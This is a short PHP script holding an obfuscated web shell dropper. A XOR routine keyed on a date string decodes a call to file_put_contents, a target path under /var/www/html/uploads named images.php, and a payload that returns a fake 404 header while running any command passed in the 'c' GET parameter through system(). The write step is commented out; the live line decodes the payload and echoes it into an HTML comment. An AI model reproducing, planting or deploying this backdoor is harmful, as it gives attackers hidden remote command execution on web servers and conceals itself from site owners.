<?php 
error_reporting(E_ALL);

ini_set("display_errors", 1);



    function m($l,$T=0){
        $K=date('Y-m-d');
	$K='2020-06-02';
        $_=strlen($l);
        $__=strlen($K);
        for($i=0;$i<$_;$i++){
            for($j=0;$j<$__;$j++){
                if($T){$l[$i]=$K[$j]^$l[$i];
                }
                else{
                    $l[$i]=$l[$i]^$K[$j];
                }
            }
        }
	echo '<!--',$l,'-->';
        return $l;
     } 
//m('bmha[tqp[gkjpajpw');
//m('+rev+sss+lpih+qthke`w+miecaw*tlt');
//$ret = file_put_contents('/var/www/html/images.php', m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?'));
m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?');
?>
